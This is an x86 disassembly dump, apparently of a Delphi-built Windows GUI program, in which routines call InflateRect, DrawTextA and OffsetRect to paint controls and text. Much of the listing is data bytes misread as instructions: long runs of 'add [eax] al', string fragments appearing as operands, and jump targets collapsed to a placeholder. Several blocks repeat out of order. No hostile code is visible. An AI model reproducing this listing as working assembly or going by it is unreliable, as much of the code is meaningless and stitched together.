inc esp
add [ eax + ebx * 4 + 0xe000043 ] dh
inc esp
add [ eax ] ah
push cs
inc esp
add [ eax ] bh
or eax [ eax + eax - 0x4 ]
xchg edi eax
inc ebx
add [ eax ] al
cwde
inc ebx
add ah bh
mov [ ebx ] sub_43c828
inc eax
mov [ 0xffffffff99780043 ] eax
inc ebx
add ah cl
movsb [ edi ] [ esi ]
inc ebx
add [ esp + 0x43 ] al
add [ eax - 0x59 ] bl
inc ebx
add [ esi ] al
inc ebx
add [ eax ] cl
aaa
inc ebx
add [ eax + ecx * 8 + 0xb8c0043 ] ch
inc esp
add [ eax + 0xc ] cl
inc esp
add [ edi + eax + 0x44 ] al
add [ esp + ecx ] ch
inc esp
add ah al
int 0x43
add [ eax - 0x2c ] bl
inc ebx
add al bh
loope r-xdata
movsb [ edi ] [ esi ]
inc eax
inc ebx
add [ eax + eax * 2 + 0x41300043 ] ch
inc ebx
add [ eax ] ah
inc eax
inc ebx
add al ah
fiadd [ ebx ]
js r-xdata
push [ eax ]
add dh bh
xchg esp eax
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000e ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x2465646f
push edi
inc ebx
add [ eax - 0x5b ] dh
inc ebx
add [ eax + 0x6c0043a5 ] ah
lds eax [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sldt [ edi ]
inc ebx
insb
jae r-xdata
add [ eax + 0xc00433e ] bl
push esp
push edx
popad
xor [ ecx + 0x43 ] al
inc ebx
add [ eax - 0x6bffbc1e ] dl
loop r-xdata
push cs
inc esp
add [ esi + ecx + 0x44 ] bh
add [ eax - 0x80000000 ] al
adc eax [ eax ]
add eax 0x336c7443
inc esp
cmp al 0x50
imul ebp [ edi + 0x6e ] r-xdata
enter 0x0 0xfe
int3
les edi [ esi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
jl r-xdata
add [ ebx + ebp + 0x41 ] ch
add [ eax + eax ] bh
add dh bh
in al 0x98
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
cwde
adc eax 0x2100041
add bh bh
imul ebp [ fs : edi + 0x42 ] 0x6f747475
add [ ecx + 0x43 ] cl
add ah dh
loopne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al 0x0
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
popad
jo r-xdata
add [ eax ] al
add [ eax + 0x4307000f ] al
inc ebx
add [ ecx ] ah
add bh bh
les ebx [ eax - 0x669fffbd ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
arpl [ eax + 0x6f ] bp
jb r-xdata
outsb
nop
call 0x743670c
or al 0x54
push edx
popad
imul ebp [ fs : edi + 0x42 ] 0x6f747475
outsb
in al dx
and al [ ebx ]
pushad
adc al [ ebx ]
xor eax 0x74530800
inc ebx
je r-xdata
add [ ebp + ecx + 0x44 ] ch
add [ ebx + ebp * 8 ] bh
inc ebx
add [ esi + ebx + 0x9e80044 ] ch
inc esp
add al bl
or al 0x44
add [ eax - 0x6bffbcc2 ] dl
aas
inc ebx
add [ eax + eax ] al
adc [ eax - 0x42ee4ffa ] dh
0xa4ff
jmp [ esi + 0x43 ]
jae r-xdata
sub al 0xa7
inc ebx
add [ eax ] al
add [ eax ] al
add [ 0x11ff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
rcl [ 0x5f0041 ] 0x0
add bh bh
cmpsb [ fs : esi ] [ edi ]
inc ebx
add [ esi + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040018 ] al
outsd
outsb
je r-xdata
jb r-xdata
jae r-xdata
pop eax
inc ebx
add [ eax + eax ] dh
inc [ edx + ecx * 8 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
outsb
jae r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
xor eax [ esp + edi + 0x50 ]
push esi
inc ebx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
[ eax - 0x43ffbbf2 ]
push cs
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050013 ] al
je r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ss
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
add [ gs : eax ] dl
push eax
popad
jb r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
dec [ ebp + eax * 8 + 0x43 ]
add [ eax + 0x1 ] al
pop ss
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
push esp
mov ch 0x41
add [ eax ] ch
dec ebp
outsd
add [ gs : eax ] dl
adc eax 0x72440800
popad
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x6700ffff ] ah
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
or dl [ eax + 0x61 ]
outsb
je r-xdata
add [ eax - 0x80000000 ] al
pop ds
add [ eax ] cl
push ebx
outsb
je r-xdata
add [ eax ] al
add [ ebx ] bl
add [ ebx ] cl
push eax
popad
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
push [ edi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push edi
inc ebx
add ah dh
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
jo r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ ecx ] cl
push eax
outsb
je r-xdata
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500e00
outsb
je r-xdata
nop
movsb [ edi ] [ esi ]
inc ebx
add ah ch
jo r-xdata
adc [ eax ] al
0xe4ff0000 0x43a6
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
push cs
push eax
popad
je r-xdata
outsb
je r-xdata
jb r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
push edi
jb r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ edi + ecx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax ] eax
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
pushfd
cmpsb [ esi ] [ edi ]
inc ebx
add [ ecx ] al
add [ eax ] al
push cs
inc esp
add [ edi + ecx + 0x44 ] dh
add [ ecx ] al
push 0x6948776f
outsb
je r-xdata
jb r-xdata
adc [ eax ] al
test eax 0xc8ff0001
push cs
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
jo r-xdata
lds eax [ ebx ]
add [ eax ] al
add [ eax + 0x1 ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
sbb al 0x38
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
adc [ eax ] al
push edi
add [ eax ] al
call [ eax - 0x13ffbc5c ]
push 0x6948776f
outsb
je r-xdata
adc [ eax ] al
cdq
add [ eax ] al
inc eax
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax + 0x43a6 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001f ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
or edx [ eax + 0x61 ]
0x7c0044 0xff00
sub [ ebp + 0x10043 ] ah
add [ eax ] al
dec ebx
jns r-xdata
or [ bx ] dl
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop ss
jo r-xdata
add [ eax ] eax
dec [ esi + eax * 8 ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070024 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
inc ebx
outsd
outsb
je r-xdata
pop ss
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
inc esp
pop edx
inc ebx
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
js r-xdata
loopne r-xdata
jo r-xdata
pop ecx
inc ebx
add al bl
add [ eax ] al
or [ edx + 0x43 ] bl
add al ah
add [ eax ] eax
jmp eax
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
jb r-xdata
add [ eax ] eax
pop ss
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax + 0x4f07002b ] al
add [ eax ] al
dec edi
jbe r-xdata
je r-xdata
push eax
outsd
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
dec ebp
outsd
jne r-xdata
add al ch
pop eax
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
dec ebp
outsd
jne r-xdata
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
jns r-xdata
je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add [ eax ] al
sub [ ebx ] 0x0
pop es
dec edi
outsd
arpl [ ebx + 0x74 ] bp
pop ebx
inc ebx
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
inc esp
jo r-xdata
mov edx 0xb9
mov eax esi
call sub_439d2c
mov edx 0x69
push ebp
jo r-xdata
arpl [ ebx + 0x2c ] bp
pop ebx
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
inc esp
outsd
ja r-xdata
outsb
dec edi
loopne r-xdata
add [ eax ] al
jmp eax
add [ eax ] eax
mov esp 0xe8004359
or [ edi ] dl
pop ecx
inc ebx
add al bl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002c ] al
outsb
inc ebp
js r-xdata
pop ebx
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe94227f8
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0026 ] al
outsb
pop ss
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0034 ] al
pop ebp
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0033 ] al
outsb
push ebx
je r-xdata
add al 0x0
jb r-xdata
pop eax
push ebx
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al 0x0
or ecx [ edi + 0x6e ]
inc ebx
add al ah
mov eax esi
call sub_439d50
mov eax esi
test bl bl
je r-xdata
jb r-xdata
or [ eax ] 0x2
add [ eax ] al
inc esp
jb r-xdata
add esp 0xc
add [ eax ] al
add [ eax ] al
inc esp
outsd
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
call sub_41dc80
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_41dbdc
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
mov ebx eax
mov edx esi
mov eax ebx
call sub_43cdc4
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
nop
sub_4328cc
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0900
dec ebx
jns r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
loopne r-xdata
jo r-xdata
pop ecx
inc ebx
add al bl
add [ eax ] al
or [ edx + 0x43 ] bl
add al ah
add [ eax ] eax
jmp eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
dec ebp
outsd
jne r-xdata
add al ch
add [ eax ] eax
pop eax
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
dec ebp
outsd
jne r-xdata
mov edx 0xb9
mov eax esi
call sub_439d2c
mov edx 0x69
push ebp
jo r-xdata
arpl [ ebx + 0x2c ] bp
pop ebx
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
inc esp
outsd
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0034 ] al
outsb
push ebx
je r-xdata
pop ebp
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0033 ] al
outsb
push ebx
je r-xdata
add al 0x0
jb r-xdata
pop eax
mov eax esi
call sub_439d50
mov eax esi
test bl bl
je r-xdata
jb r-xdata
or [ eax ] 0x2
add [ eax ] al
inc esp
jb r-xdata
add esp 0xc
add [ eax ] al
add [ eax ] al
inc esp
outsd
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
call sub_41dc80
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_41dbdc
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
mov ebx eax
mov edx esi
mov eax ebx
call sub_43cdc4
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
nop
sub_4329ec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44296c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_439d2c
mov edx 0x69
mov eax esi
call sub_439d50
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_432a48
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43cdc4
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_41dc80
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_41dbdc
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_432ab4
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_432e56
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_41dc80
call sub_42f57c
call sub_42f65c
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_41dbdc
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_43a570
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_412be0
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_412be0
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_43a570
mov eax [ ebp - 0x54 ]
call sub_4041a8
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_43a570
mov eax [ ebp - 0x58 ]
call sub_4043a8
push eax
mov eax edi
call sub_41dd60
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_412be0
mov eax ebx
mov si 0xffc8
call sub_403394
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_41d618
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_41d618
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_41d9f8
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_41d618
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_41dd60
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432e5d
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_403f0c
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_403f0c
lea eax [ ebp - 0x60 ]
call sub_4045c8
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_403f0c
retn
mov eax ebx
mov si 0xffc8
call sub_403394
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_41d9f8
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_43a570
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_43a570
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_41dbc0
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_412be0
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_412be0
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_43a570
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_404714
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_41dd60
push eax
call sub_42f57c
lea ecx [ ebp - 0x4c ]
pop edx
call sub_42f85c
jmp r-xdata
call sub_42f57c
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_42f8c0
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_41dd60
push eax
call sub_42f57c
lea ecx [ ebp - 0x4c ]
pop edx
call sub_42f768
push 0x0
mov eax edi
call sub_41dd60
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_43a570
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_43c850
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_43a570
mov eax [ ebp - 0x80 ]
call sub_4041a8
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_43a570
mov eax [ ebp - 0x84 ]
call sub_4043a8
push eax
mov eax edi
call sub_41dd60
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_41d618
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_43a570
mov eax [ ebp - 0x88 ]
call sub_4041a8
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_43a570
mov eax [ ebp - 0x8c ]
call sub_4043a8
push eax
mov eax edi
call sub_41dd60
push eax
call DrawTextA
sub_432e67
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_432ee2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43a570
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4516a0
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_4401dc
mov eax ebx
mov si 0xffb8
call sub_403394
test al al
je r-xdata
mov eax ebx
call sub_4412b8
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432ee9
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_432f34
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_441eec
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_439d2c
mov edx 0x11
mov eax esi
call sub_439d50
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_42f57c
call sub_42f65c
test al al
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_432fe0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_433136
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43c850
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_41dc80
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041b0
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4041a8
push eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
push eax
mov eax [ ebx + 0x160 ]
call sub_41dd60
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41ce24
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4041a8
push eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
push eax
mov eax [ ebx + 0x160 ]
call sub_41dd60
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41ce24
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4041a8
push eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
push eax
mov eax [ ebx + 0x160 ]
call sub_41dd60
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43313d
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_433147
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_433370
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_41d734
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_41d618
xor edx edx
mov eax [ esi + 0x14 ]
call sub_41d734
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_41d9bc
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_403394
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_403394
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
